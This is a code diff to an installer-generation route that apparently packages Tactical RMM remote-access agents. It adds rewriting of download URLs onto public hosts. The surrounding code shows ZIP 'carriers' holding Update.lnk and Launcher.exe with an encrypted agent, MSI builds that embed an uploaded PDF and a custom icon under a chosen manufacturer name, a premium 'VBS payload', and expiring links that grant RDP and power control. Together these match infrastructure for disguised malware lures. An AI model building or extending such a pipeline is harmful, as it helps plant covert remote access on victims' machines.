@@ -7,6 +7,10 @@ import { db } from "@/lib/db";
 import { createDeviceSite } from "@/lib/devices";
 import { env } from "@/lib/env";
 import { GenerationQueueFullError, withGenerationSlot } from "@/lib/generation-queue";
+import {
+  resolveInstallerDownloadHost,
+  rewriteInstallerDownloadUrl,
+} from "@/lib/installer-download-host";
 import { callMsiGenerator } from "@/lib/msi-generator";
 import { callZipGenerator } from "@/lib/zip-generator";
 import { createDeployment, createManualInstaller, deployUrl } from "@/lib/trmm";
@@ -116,6 +120,13 @@ async function handleDeployment(request: Request) {
   // as defense-in-depth for any future internal/admin private-installer path
   // (Task 62 needs a private-domain install command to exist somewhere).
   const agentApiBaseUrl = resolveAgentApiBaseUrl(org.agentDomainTier);
+
+  // Task 74: tier-resolved customer-facing download host for the ZIP/MSI
+  // generator (public → https://dl.broks.beauty; private → undefined =
+  // generator default). Resolved via the same isPrivateTier rule as the agent
+  // host above — no re-derived tier logic. Unreachable for private orgs via
+  // self-service (403 above); kept as defense-in-depth.
+  const installerDownloadHost = resolveInstallerDownloadHost(org.agentDomainTier);
 
   // Branch on Content-Type: JSON (merged/separated) vs multipart/form-data (msi,
   // which carries an uploaded PDF file).
@@ -357,6 +368,9 @@ async function handleDeployment(request: Request) {
           exeUrl: deployUrl(dep.uid, agentApiBaseUrl),
           features: ["rdp", "ping", "power"],
           expiryHours: parsed.expiryHours,
+          // Task 74: ask the generator to mint the link on the public host;
+          // rewrite below covers older generators that ignore the field.
+          downloadHost: installerDownloadHost,
           // Launcher mode (WP4): ship the offline carrier zip
           // { Update.lnk, Launcher.exe } — the launcher carries the encrypted
           // agent + per-device config; nothing is downloaded at runtime.
@@ -368,10 +382,13 @@ async function handleDeployment(request: Request) {
           innerFolder: parsed.innerFolder,
           zipName: parsed.zipName,
         });
-        zipUrl = zip.downloadUrl;
+        // Task 74 defense-in-depth: an older generator (or any path that
+        // ignores downloadHost) still mints dl.instaweb.top — rewrite to the
+        // public host for public-tier orgs; no-op for private/dev hosts.
+        zipUrl = rewriteInstallerDownloadUrl(zip.downloadUrl, org.agentDomainTier);
         result = {
           installMethod: "zip" as const,
-          downloadUrl: zip.downloadUrl,
+          downloadUrl: zipUrl,
           command: null,
           installerUrl: null,
         };
@@ -434,15 +451,20 @@ async function handleDeployment(request: Request) {
           manufacturer: org.name ?? "Vantra",
           pdf: pdf!,
           ico: ico ?? undefined,
+          // Task 74: ask the generator to mint every URL (including hosts
+          // baked INSIDE the VBS payload) on the public host; rewrites below
+          // cover older generators that ignore the field.
+          downloadHost: installerDownloadHost,
         });
         msiReady = true;
         if (isPremium) {
-          vbsUrl = msi.vbsUrl;
-          exeUrl = msi.exeUrl ?? null;
+          vbsUrl = rewriteInstallerDownloadUrl(msi.vbsUrl, org.agentDomainTier);
+          const rewrittenExe = rewriteInstallerDownloadUrl(msi.exeUrl, org.agentDomainTier);
+          exeUrl = typeof rewrittenExe === "string" ? rewrittenExe : null;
         }
         result = {
           installMethod: "msi" as const,
-          downloadUrl: msi.downloadUrl,
+          downloadUrl: rewriteInstallerDownloadUrl(msi.downloadUrl, org.agentDomainTier),
           vbsUrl,
           exeUrl,
           command: null,
